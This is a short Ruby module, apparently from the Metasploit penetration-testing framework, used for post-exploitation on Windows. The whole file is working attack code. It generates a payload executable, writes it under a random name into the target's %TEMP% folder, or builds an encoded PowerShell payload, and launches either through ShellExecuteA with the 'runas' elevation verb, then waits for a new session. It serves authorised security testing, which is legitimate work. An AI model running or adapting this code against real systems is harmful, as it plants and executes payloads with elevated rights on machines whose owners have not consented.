# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell

  def shell_execute_exe(filename = nil, path = nil)
    exe_payload = generate_payload_exe
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = path || expand_path('%TEMP%')
    cmd_location = "#{payload_path}\\#{payload_filename}"
    print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
    write_file(cmd_location, exe_payload)
    command, args = cmd_location, nil
    shell_exec(command, args)
  end

  def shell_execute_psh
    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    command = 'cmd.exe'
    args = "/c #{powershell_command}"
    shell_exec(command, args)
  end

  def shell_exec(command, args)
    print_status('Executing Command!')
    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
    ::Timeout.timeout(30) do
      select(nil, nil, nil, 1) until session_created?
    end
  end
end
